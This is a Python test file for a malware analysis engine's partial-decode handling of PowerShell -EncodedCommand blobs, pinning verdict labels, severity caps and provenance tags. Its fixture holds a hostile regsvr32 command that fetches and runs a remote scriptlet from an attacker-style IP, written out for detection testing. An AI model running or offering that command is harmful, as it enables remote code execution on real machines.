"""ADR-0012 · Progressive Partial Recovery — regression pins.

Governance:
    /app/memory/adr/0012-progressive-partial-recovery.md

These tests pin the contract that when the PowerShell -EncodedCommand
recovery chain fails but the decoder recovered a readable prefix,
the analysis engine runs IOC / MITRE / LOLBin extraction on the
prefix and returns a `Partial Decode` verdict — not `Undetermined`.

Decoder invariants stay unchanged: no invented bytes, no stitched
reconstruction. Partial evidence is severity-capped at Suspicious
(ADR-0007 §2.3) and every derived evidence item carries
`provenance: partial_recovery`.
"""
import base64
import re
import sys
from pathlib import Path

BACKEND = Path(__file__).resolve().parent.parent
if str(BACKEND) not in sys.path:
    sys.path.insert(0, str(BACKEND))

from v2.semantic.ps_recovery import recover_powershell_from_b64
from routers.ops import _run_progressive_analysis, _classify_partial_cause


def _make_truncated_regsvr32_blob(prefix_bytes: int = 60) -> tuple[str, object]:
    """Build a PS-EncodedCommand blob that decodes cleanly for the first
    `prefix_bytes` bytes of UTF-16LE, then hits an unpaired surrogate.
    Returns `(blob, decode_report)`.
    """
    cmd = "regsvr32 /u /s /i:http://192.168.48.129/test.jpg scrobj.dll"
    utf16le = cmd.encode("utf-16-le")
    # Prefix + unpaired high surrogate + noise → guaranteed decode_error.
    corrupted = utf16le[:prefix_bytes] + b"\xd8\x00" + b"\xff\xff" * 5
    blob = base64.b64encode(corrupted).decode()
    rep = recover_powershell_from_b64(blob)
    return blob, rep


# ─── Contract 1 · Operator's regsvr32 case produces "Partial Decode" ────
def test_adr0012_regsvr32_partial_recovery_produces_partial_decode():
    blob, rep = _make_truncated_regsvr32_blob(60)

    # Sanity: decoder path did fail as expected.
    assert rep.status == "decode_error", rep.status
    assert rep.partial_recovery, "decoder should have recovered a prefix"
    assert "regsvr32" in rep.partial_recovery["prefix_text"]

    resp = _run_progressive_analysis(
        partial_recovery=dict(rep.partial_recovery),
        decode_report=rep,
        blob_len=len(blob),
    )
    assert resp is not None, "§2.2 gate must pass for regsvr32-length prefix"

    # ADR-0012 §2.4 governance-mandatory labels.
    assert resp["verdict"] == "partial_decode"
    assert resp["verdict_display"] == "Partial Decode"
    assert resp["verdict_card"]["verdict_display"] == "Partial Decode"
    assert resp["cause"] == "truncated"
    assert resp["iocs"]["provenance"] == "partial_recovery"
    assert resp["output"] == rep.partial_recovery["prefix_text"]

    # Progressive extractors fired on the prefix.
    mitre_ids = [m["id"] for m in resp["mitre"]]
    assert "T1218.010" in mitre_ids, f"regsvr32 rule missing: {mitre_ids}"
    lolbin_names = [l["name"] for l in resp["lolbas"]]
    assert "regsvr32" in lolbin_names, f"LOLBin missing: {lolbin_names}"

    # Every derived evidence item carries `provenance: partial_recovery`.
    for m in resp["mitre"]:
        assert m["provenance"] == "partial_recovery"
        assert "truncation_note" in m
    for l in resp["lolbas"]:
        assert l["provenance"] == "partial_recovery"


# ─── Contract 2 · Severity cap — never Malicious from partial evidence ──
def test_adr0012_severity_cap_never_exceeds_suspicious():
    _, rep = _make_truncated_regsvr32_blob(60)
    resp = _run_progressive_analysis(
        partial_recovery=dict(rep.partial_recovery),
        decode_report=rep,
        blob_len=64,
    )
    assert resp["verdict_card"]["severity_cap"] in ("Suspicious", "Undetermined")
    # Risk score is never numeric — analyst must know evidence is partial.
    assert resp["verdict_card"]["risk_score"] is None
    assert resp["verdict_card"]["score"] is None


# ─── Contract 3 · Empty prefix → gate rejects, falls back to Undetermined
def test_adr0012_empty_prefix_gate_rejects():
    """When decoder recovers nothing readable, §2.2 gate MUST return None
    so the endpoint falls back to the legacy Undetermined path.
    """
    # Synthesise a decode_report with an empty partial_recovery.
    class _FakeReport:
        status = "decode_error"
        b64_bytes = 0
        b64_status = ""
        b64_reason = "base64 rejected"
        first_invalid_offset = 0
        invalid_reason = ""
        hex_preview = ""
        possible_causes = ()
        attempts = []
        confidence_band = "none"
        confidence_reason = ""
        recovered_layers = "0/0"
    resp = _run_progressive_analysis(
        partial_recovery={},
        decode_report=_FakeReport(),
        blob_len=0,
    )
    assert resp is None, "§2.2 gate must reject empty prefix"


# ─── Contract 4 · Below-threshold prefix → gate rejects ──────────────────
def test_adr0012_short_prefix_gate_rejects():
    """§2.2 requires ≥6 printable chars AND ≥1 alpha in prefix_text."""
    class _FakeReport:
        status = "decode_error"
        b64_bytes = 8
        b64_status = "ok"
        b64_reason = ""
        first_invalid_offset = 4
        invalid_reason = ""
        hex_preview = ""
        possible_causes = ()
        attempts = []
        confidence_band = "low"
        confidence_reason = ""
        recovered_layers = "0/1"
    # Too short (< 6 chars)
    assert _run_progressive_analysis(
        partial_recovery={"prefix_text": "abc"},
        decode_report=_FakeReport(), blob_len=8,
    ) is None
    # No alpha chars
    assert _run_progressive_analysis(
        partial_recovery={"prefix_text": "123456"},
        decode_report=_FakeReport(), blob_len=8,
    ) is None


# ─── Contract 5 · Cause classifier — deterministic first-match ───────────
def test_adr0012_cause_classifier_truncated_dominates_when_prefix_recovered():
    class _R:
        possible_causes = (
            "Nested encoding not covered by the recovery chain.",
            "Truncated Base64 (missing bytes).",
        )
        b64_reason = "decoded 96-char Base64 blob"
    cause = _classify_partial_cause(
        {"prefix_text": "regsvr32 /u", "prefix_encoding": "utf-16-le"},
        _R(),
    )
    assert cause == "truncated"


def test_adr0012_cause_classifier_gzip_is_corrupted():
    class _R:
        possible_causes = ("Gzip header valid but body malformed",)
        b64_reason = ""
    cause = _classify_partial_cause({"prefix_text": ""}, _R())
    assert cause == "corrupted"


def test_adr0012_cause_classifier_no_prefix_no_family_is_unsupported():
    class _R:
        possible_causes = ()
        b64_reason = "base64 rejected"
    cause = _classify_partial_cause({}, _R())
    assert cause == "unsupported"


# ─── Contract 6 · Legacy Undetermined path is unchanged for pure failures
def test_adr0012_decoder_invariants_unchanged():
    """No invented bytes: `output` must equal `partial_recovery.prefix_text`
    verbatim — the endpoint MUST NOT stitch a reconstruction.
    """
    _, rep = _make_truncated_regsvr32_blob(60)
    resp = _run_progressive_analysis(
        partial_recovery=dict(rep.partial_recovery),
        decode_report=rep,
        blob_len=64,
    )
    assert resp["output"] == rep.partial_recovery["prefix_text"]
    assert resp["output_raw"] == rep.partial_recovery["prefix_text"]
    # No IOC value may exceed what the prefix could physically contain.
    for url in resp["iocs"]["urls"]:
        assert url in rep.partial_recovery["prefix_text"], \
            f"IOC '{url}' not found in recovered prefix — reconstruction leak!"
